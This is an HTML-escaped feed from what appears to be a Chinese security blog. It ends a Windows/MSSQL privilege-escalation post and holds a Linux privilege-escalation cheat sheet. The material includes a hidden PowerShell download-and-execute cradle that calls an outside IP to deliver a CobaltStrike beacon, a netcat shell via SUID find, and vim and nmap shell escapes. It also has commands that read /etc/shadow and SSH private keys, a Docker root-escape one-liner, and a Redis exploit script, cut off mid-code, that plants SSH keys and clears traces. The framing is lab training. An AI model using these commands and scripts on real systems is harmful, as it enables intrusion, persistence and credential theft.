&#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1# 利用jet.oledb执行命令select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)</code></pre><h3 id="通过Agent-Job执行命令"><a href="#通过Agent-Job执行命令" class="headerlink" title="通过Agent Job执行命令"></a>通过Agent Job执行命令</h3><p>修改开启Ageent Job，执行无回显CobaltStrike生成powershell上线</p><pre><code class="text">USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;test_powershell_job1&#39; ; EXEC sp_add_jobstep @job_name = N&#39;test_powershell_job1&#39;, @step_name = N&#39;test_powershell_name1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.214.129:80/a&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;test_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;</code></pre><p>整体思路<br>1.通过各种漏洞拿到shell<br>2.找网站的配置文件（找账号、密码）<br>3.使用 工具 提权</p><p>数据库防御<br>1、限止数据库远程连接，给数据库帐户设置密码必须&gt;8位以上并数字+字母+特殊符号等。<br>2、不要给网站配置root或SA权限。必须给每个网站独立分配数据库帐户并限格控制好权限。<br>3、及时升级数据库补丁。<br>4、安装Waf进行防御。<br>5、购买数据库审计设备。</p><p><strong>基本转自随风师傅，做了点小小改动，因为自己太菜了写不出来这么好的文章，随风师傅tql:<a href="https://www.cnblogs.com/sfsec/p/15162635.html">https://www.cnblogs.com/sfsec/p/15162635.html</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;为什么要提权：当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行管理员权限下的一下命令或者读取一些重要文件</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="windows提权" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/windows%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权总结</title>
    <link href="https://sakurahack-y.github.io/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-11T08:35:03.000Z</published>
    <updated>2022-03-11T09:20:44.334Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么要提权"><a href="#为什么要提权" class="headerlink" title="为什么要提权?"></a>为什么要提权?</h1><p>当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行root 权限下的一下命令或者读取/root  下的重要文件。这个时候就需要提权，在root  权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。</p><h1 id="什么是权限"><a href="#什么是权限" class="headerlink" title="什么是权限"></a>什么是权限</h1><p>在Linux 系统中，<code>ls -al</code> 即可查看列出文件所属的权限。</p><p><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220311164240865.png" alt="image-20220311164240865"></p><p>分析:</p><pre><code class="php">-rw-r--r--.  1 root root   176 5月  18 2020 .bash_profile</code></pre><p><strong>第一组数据</strong></p><pre><code class="php">-rw-r--r--</code></pre><p>第一位：</p><p><code>-</code> : 代表普通文件</p><p><code>d</code>：代表目录</p><p><code>l</code>：代表软链接</p><p><code>b</code>：代表块文件</p><p><code>c</code>：代表字符设备</p><p>第二及后面几位,分别三个为一组：</p><pre><code class="php">rw-r--r--  代表文件所属的权限</code></pre><p>r : 文件可读。w : 文件可修改。- : 表示暂时没有其他权限。x : 表示可执行</p><p>第一个<code>rw-</code> 表示文件所拥有者的权限。</p><p>第二个<code>r--</code> 表示文件所在组的用户的权限。</p><p>第三个<code>r--</code>  表示其他组的用户的权限。</p><p><strong>第二组数据</strong></p><pre><code>1</code></pre><ul><li>如果文件类型为目录，表示目录下的字目录个数</li><li>如果文件类型是普通文件，这个数据就表示这个文件的硬链接个数</li></ul><p><strong>第三组数据</strong></p><pre><code>root</code></pre><p>表示该文件所有者为root 用户</p><p><strong>第四组数据</strong></p><pre><code>root</code></pre><p>表示该文件所在组为root 组</p><p><strong>第五组数据</strong></p><pre><code>176</code></pre><p>表示文件的大小为多少字节。如果为一个目录，则为4096。</p><p><strong>第六组数据</strong></p><pre><code>5月  18 2020</code></pre><p>表示最后一次修改时间</p><p><strong>第七组数据</strong></p><pre><code>.bash_profile</code></pre><p>表示文件名称</p><p>如果为目录，r 表示可以进入该目录进行查看,w 表示文件可以进行增加,x 表示可以进入这个目录.</p><p>同样的，可以用数字代替，r=4,w=2,x=1。</p><h1 id="怎么样提权"><a href="#怎么样提权" class="headerlink" title="怎么样提权"></a>怎么样提权</h1><p>提权的本质是信息搜集。</p><h2 id="基础信息搜集"><a href="#基础信息搜集" class="headerlink" title="基础信息搜集"></a>基础信息搜集</h2><h3 id="自动化信息搜集工具"><a href="#自动化信息搜集工具" class="headerlink" title="自动化信息搜集工具"></a>自动化信息搜集工具</h3><p>LinEnum:<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>linuxprivchecker:<a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a> </p><h3 id="自动化漏洞探测工具"><a href="#自动化漏洞探测工具" class="headerlink" title="自动化漏洞探测工具"></a>自动化漏洞探测工具</h3><p>linux-exploit-suggester:<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>linux-exploit-suggester2:<a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a> </p><h3 id="内核，操作系统，设备信息"><a href="#内核，操作系统，设备信息" class="headerlink" title="内核，操作系统，设备信息"></a>内核，操作系统，设备信息</h3><pre><code>uname -a    打印所有可用的系统信息uname -r    内核版本uname -n    系统主机名。uname -m    查看系统内核架构（64位/32位）hostname    系统主机名cat /proc/version    内核信息cat /etc/*-release   分发信息cat /etc/issue       分发信息cat /proc/cpuinfo    CPU信息cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhatls /boot | grep vmlinuz-</code></pre><h3 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h3><pre><code>cat /etc/passwd     列出系统上的所有用户cat /var/mail/rootcat /var/spool/mail/rootcat /etc/group      列出系统上的所有组grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 &#123; print $1&#125;&#39;      列出所有的超级用户账户whoami              查看当前用户w                   谁目前已登录，他们正在做什么last                最后登录用户的列表lastlog             所有用户上次登录的信息lastlog –u %username%  有关指定用户上次登录的信息lastlog |grep -v &quot;Never&quot;  以前登录用户的完</code></pre><h3 id="用户权限信息"><a href="#用户权限信息" class="headerlink" title="用户权限信息"></a>用户权限信息</h3><pre><code>whoami        当前用户名id            当前用户信息cat /etc/sudoers  谁被允许以root身份执行sudo -l       当前用户可以以root身份执行操作</code></pre><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><pre><code>env        显示环境变量set        现实环境变量echo %PATH 路径信息history    显示当前用户的历史命令记录pwd        输出工作目录cat /etc/profile   显示默认系统变量cat /etc/shells    显示可用的shellrccat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logout</code></pre><h3 id="进程和服务"><a href="#进程和服务" class="headerlink" title="进程和服务"></a>进程和服务</h3><pre><code>ps auxps -eftopcat /etc/services</code></pre><p>查看以root 运行的进程</p><pre><code>ps aux | grep rootps -ef | grep root</code></pre><h3 id="查看安装的软件"><a href="#查看安装的软件" class="headerlink" title="查看安装的软件"></a>查看安装的软件</h3><pre><code>ls -alh /usr/bin/ls -alh /sbin/ls -alh /var/cache/yum/dpkg -l</code></pre><h3 id="服务-插件"><a href="#服务-插件" class="headerlink" title="服务/插件"></a>服务/插件</h3><p>检查有没有不安全的服务配置，和一些有漏洞的插件。</p><pre><code>cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/</code></pre><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><pre><code>crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root</code></pre><h3 id="有无明文存放用户密码"><a href="#有无明文存放用户密码" class="headerlink" title="有无明文存放用户密码"></a>有无明文存放用户密码</h3><pre><code>grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</code></pre><p>Vulnhub 上的靶机就体现在，通过邮件明文传输密码了，然后就可以通过ssh登陆了。进行新的信息搜集。</p><h3 id="有无ssh-私钥"><a href="#有无ssh-私钥" class="headerlink" title="有无ssh 私钥"></a>有无ssh 私钥</h3><pre><code>cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key</code></pre><h3 id="查看与当前机器通信的其他用户或者主机"><a href="#查看与当前机器通信的其他用户或者主机" class="headerlink" title="查看与当前机器通信的其他用户或者主机"></a>查看与当前机器通信的其他用户或者主机</h3><pre><code>lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw</code></pre><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><pre><code>cat /var/log/boot.logcat /var/log/croncat /var/log/syslogcat /var/log/wtmpcat /var/run/utmpcat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</code></pre><h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;echo os.system(&#39;/bin/bash&#39;)/bin/sh -i</code></pre><h3 id="可提权SUID-amp-amp-GUID"><a href="#可提权SUID-amp-amp-GUID" class="headerlink" title="可提权SUID &amp;&amp; GUID"></a>可提权SUID &amp;&amp; GUID</h3><blockquote><p>参考资料<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p></blockquote><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</code></pre><h3 id="查看可写-执行目录"><a href="#查看可写-执行目录" class="headerlink" title="查看可写/执行目录"></a>查看可写/执行目录</h3><pre><code>find / -writable -type d 2&gt;/dev/null      # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o w -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o x -type d 2&gt;/dev/null     # world-executable foldersfind / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</code></pre><h3 id="查看安装过的工具"><a href="#查看安装过的工具" class="headerlink" title="查看安装过的工具"></a>查看安装过的工具</h3><pre><code>find / -name perl*find / -name python*find / -name gcc*...</code></pre><h1 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h1><h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><blockquote><p>什么是suid？suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。需要注意的是，只有程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。</p></blockquote><p>这里推荐 P师傅的 <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>常见的可用来提权的Linux 可执行文件有：</p><p>Nmap, Vim, find, bash, more, less, nano, cp</p><p>查看可以suid 提权的可执行文件</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220311170215513.png" alt="image-20220311170215513"></p><ul><li>find</li></ul><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-793add5c-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-793add5c-ba7a-1.png" alt="img"></a></p><pre><code>ls -al /usr/bin/find-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><blockquote><p>实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p></blockquote><p>比如：DC -1 靶机就是利用find 命令进行root 用户来执行命令</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-796d1704-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-796d1704-ba7a-1.png" alt="img"></a></p><p>大部分Linux 系统都安装了nc。使用<code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code>  即可成功反弹root shell</p><ul><li>nmap</li></ul><p>早期nmap 具有交互模式，version 2.02～5.21（5.2.0）。这里我用metasploitable2 来演示</p><p><code>namp -V</code> 查看nmap 版本信息</p><pre><code>nmap --interactive</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164705-9e3b1b62-b2d2-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164705-9e3b1b62-b2d2-1.png" alt="img"></a></p><p>我最喜欢的<code>Metasploit</code> 中就有利用 SUID nmap 提权的exp</p><p><code>search nmap</code> 然后利用 <code>exploit/unix/local/setuid_nmap</code> 漏洞利用模块即可</p><p>5.2.0 之后，nmap 还可以通过执行脚本来提权。</p><pre><code># nse 脚本，shell.nseos.execute(&#39;/bin/sh&#39;)# nmap 提权nmap --script=shell.nse # 在某些发行版的Linux 可能会提权失败。具体原理移步p 师傅文章</code></pre><p>或者</p><pre><code>echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; getshellsudo nmap --script=getshell</code></pre><p>参考DC 6 靶机：<a href="https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83">https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83</a></p><ul><li>vim</li></ul><p>如果vim 是通过SUID运行，就会继承root用户的权限。可读取只有root能读取的文件。</p><pre><code>vim /etc/shadow</code></pre><p>vim 运行shell</p><pre><code>vim:set shell=/bin/sh:shell</code></pre><p>同理，满足条件的 less 和 more 都可。</p><h3 id="利用内核漏洞"><a href="#利用内核漏洞" class="headerlink" title="利用内核漏洞"></a>利用内核漏洞</h3><p>比如DC 3 靶机，就是利用系统内核漏洞来进行提权。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-79a162ac-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-79a162ac-ba7a-1.png" alt="img"></a></p><pre><code>searchsploit Ubuntu 16.04</code></pre><p>将exp 下载下来，解压，编译，运行，即可get root 权限。</p><pre><code>tar xvf exploit.tar</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-79fd0a12-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-79fd0a12-ba7a-1.png" alt="img"></a></p><p><a href="https://www.exploit-db.com/exploits/39772">https://www.exploit-db.com/exploits/39772</a></p><p>还有大名鼎鼎的CVE-2016-5195，脏牛漏洞。（Linux kernel &gt;=2.6.22 并且Android也受影响</p><ul><li><a href="https://github.com/timwr/CVE-2016-5195">https://github.com/timwr/CVE-2016-5195</a></li><li><a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li><li>复现参考：<a href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a></li></ul><p>其他内核漏洞：</p><p>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) – ‘overlayfs’ Local Root Shell</p><p><a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p><p>Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root Exploit</p><p><a href="https://www.exploit-db.com/exploits/39166/">https://www.exploit-db.com/exploits/39166/</a></p><p>Linux Kernel 4.3.3 – ‘overlayfs’ Local Privilege Escalation</p><p><a href="https://www.exploit-db.com/exploits/39230/">https://www.exploit-db.com/exploits/39230/</a></p><blockquote><p>提示：内核exploit提权有风险，有可能会崩溃系统。</p></blockquote><h3 id="利用root无密码执行"><a href="#利用root无密码执行" class="headerlink" title="利用root无密码执行"></a>利用root无密码执行</h3><p>简单来说，就是一个脚本，比如py,sh等或者是一个命令。这个文件可以以root身份运行，若在无密码的情况下执行的话，我们可以通过修改脚本内容/或者直接执行这个命令，利用命令来进行一些操作，来进行提权。</p><p>比如常见的：</p><ul><li>写入一个root身份权限的用户进入/etc/passwd 文件中</li></ul><p>这里以DC 4 为例子：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-7a2357bc-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-7a2357bc-ba7a-1.png" alt="img"></a></p><p><code>teehee -a</code> 将输入的内容追加到另一个文件中</p><p>简单说下<code>/etc/passwd</code> 各个字段的含义：</p><pre><code>username:password:User ID:Group ID:comment:home directory:shell</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-7a3b91c4-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-7a3b91c4-ba7a-1.png" alt="img"></a></p><p>成功获取到root 权限。类似的操作还有很多，核心思想不变。</p><h3 id="利用环境变量提权"><a href="#利用环境变量提权" class="headerlink" title="利用环境变量提权"></a>利用环境变量提权</h3><p><code>PATH</code> 是Linux 和 Unix  操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。</p><p>使用echo命令显示当前PATH环境变量：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164053-c0c00b12-b2d1-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164053-c0c00b12-b2d1-1.png" alt="img"></a></p><p>如果你在PATH变量中看到<code>.</code>，则意味着登录用户可以从当前目录执行二进制文件/脚本</p><p>我们先编译一个可执行文件shell。</p><pre><code>#include&lt;unistd.h&gt;void main()&#123;  setuid(0);  setgid(0);  system(&quot;cat /etc/passwd&quot;);&#125;// aaa.c</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164152-e392c15c-b2d1-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164152-e392c15c-b2d1-1.png" alt="img"></a></p><p>在给该文件赋予权限。</p><p>然后查看它的权限可以发现是有<code>s</code> 位，即suid。</p><p>现在我们在目标机器上用<code>find / -perm -u=s -type f 2&gt;/dev/null</code> 来查看可以suid提权的文件，发现之前编译的shell可执行文件在里面。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png" alt="img"></a></p><p>更多的操作可以参考：<a href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a></p><h3 id="利用存在漏洞的命令"><a href="#利用存在漏洞的命令" class="headerlink" title="利用存在漏洞的命令"></a>利用存在漏洞的命令</h3><p>不可否认的是命令很多，我们不可能熟悉每一种命令的漏洞。不过我们每次遇到了都可以用<code>searchsploit</code> 来寻找可利用的exp。</p><p>这里以DC 5 靶机为例：</p><p><code>ls -al</code> ：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103619-7a819cc8-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103619-7a819cc8-ba7a-1.png" alt="img"></a></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103619-7acd7cec-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103619-7acd7cec-ba7a-1.png" alt="img"></a></p><p>可以通过cat 读取一下这个文件怎么用。</p><p>攻击机器开启一个http 服务：</p><pre><code>python -m SimpleHTTPServer</code></pre><p>将exploit 用 wget 下载到可执行的<code>/tmp/</code>目录下。然后执行<code>sh</code> 文件。最后在<code>/etc/</code>目录下执行<code>./rootshell</code> 即可get root shell。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7afc19bc-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103620-7afc19bc-ba7a-1.png" alt="img"></a></p><hr><p>还有之前爆的sudo 提权，CVE-2019-14187。只不过比较鸡肋。</p><blockquote><p><strong>Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。</strong></p></blockquote><p><strong>利用前提</strong></p><ol><li>sudo -v &lt; 1.8.28</li><li>知道当前用户的密码</li><li>当前用户存在于sudo权限列表</li></ol><p>复现参考：<a href="https://www.cnblogs.com/ethtool/p/12176730.html">https://www.cnblogs.com/ethtool/p/12176730.html</a></p><h3 id="利用第三方服务提权"><a href="#利用第三方服务提权" class="headerlink" title="利用第三方服务提权"></a>利用第三方服务提权</h3><h4 id="Docker-组提权"><a href="#Docker-组提权" class="headerlink" title="Docker 组提权"></a>Docker 组提权</h4><p>参考文章：<a href="https://blog.csdn.net/qq_41918771/article/details/103666135">https://blog.csdn.net/qq_41918771/article/details/103666135</a></p><blockquote><p>docker 组内用户执行命令的时候会自动在所有命令前添加 sudo。因为设计或者其他的原因，Docker  给予所有 docker 组的用户相当大的权力（虽然权力只体现在能访问 /var/run/docker.sock 上面）。默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。Docker 守护进程会允许 root 用户和 docker<br> 组用户访问 Docker。给用户提供 Docker 权限和给用户无需认证便可以随便获取的 root 权限差别不大。</p></blockquote><p>普通用户执行：即可获得root权限。</p><pre><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7b334f7c-ba7a-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7b334f7c-ba7a-1.png" alt="img"></a></p><h4 id="MySQL-UDF-提权"><a href="#MySQL-UDF-提权" class="headerlink" title="MySQL UDF 提权"></a>MySQL UDF 提权</h4><p>之前在做JarivsOJ CTF 里有一个题，里面就用了UDF，那是我第一次遇到这个东西。</p><pre><code>show variables like &#39;%compile%&#39;;show variables like &#39;plugin%&#39;;</code></pre><p>不过这里有一个限制，<code>show global variables like &#39;secure%&#39;</code> secure_file_priv 没有具体的值（即能够导出/写入文件</p><blockquote><p>当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br> 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权<br> 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</p></blockquote><p>MSF 中的 <code>exploit/multi/mysql/mysql_udf_payload</code> 漏洞利用模块可以进行UDF提权</p><p>使用 <code>select sys_exec(&#39;whoami&#39;);</code> 或 <code>select sys_eval(&#39;whoami&#39;);</code> 来执行系统命令</p><h4 id="Redis-批量getshell"><a href="#Redis-批量getshell" class="headerlink" title="Redis 批量getshell"></a>Redis 批量getshell</h4><blockquote><p>如果Redis以root身份运行，黑客可以利用Redis写入SSH公钥文件，直接通过SSH免密码登录受害服务器。Redis 默认绑定在6379端口，并且没有开启认证，在没有任何访问策略的情况下，任何人可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p></blockquote><p>相关利用exp：<a href="https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py">https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py</a></p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-# project = https://github.com/Xyntax/POC-T# author = i@cdxy.me&quot;&quot;&quot;redis getshell expliot (ssh authorized_keys)&quot;&quot;&quot;import redisimport paramikofrom plugin.util import host2IPfrom plugin.util import randomStringfrom plugin.util import checkPortTcpfrom paramiko.ssh_exception import SSHExceptionpublic_key = &#39;ssh-rsa =====&#39;private_key = &quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----=====-----END RSA PRIVATE KEY-----&quot;&quot;&quot;import timedef poc(url):    url = host2IP(url)    ip = url.split(&#39;:&#39;)[0]    port = int(url.split(&#39;:&#39;)[-1]) if &#39;:&#39; in url else 6379    try:        if not checkPortTcp(ip, 22):            return False        r = redis.Redis(host=ip, port=port, db=0)        if &#39;redis_version&#39; in r.info():            key = randomString(10)            r.set(key, &#39;\n\n&#39; + public_key + &#39;\n\n&#39;)            r.config_set(&#39;dir&#39;, &#39;/root/.ssh&#39;)            r.config_set(&#39;dbfilename&#39;, &#39;authorized_keys&#39;)            r.save()            r.delete(key)  # 清除痕迹            r.config_set(&#39;dir&#39;, &#39;/tmp&#39;)            time.sleep(5)            if testConnect(ip, 22):                return True    except Exception:        return False    return Falsedef testConnect(ip, port=22):    try:        s = paramiko.SSHClient()        s.load_system_host_keys()        s.connect(ip, port, username=&#39;root&#39;, pkey=private_key, timeout=10)        s.close()        return True    except Exception, e:        if type(e) == SSHException:            return True        return 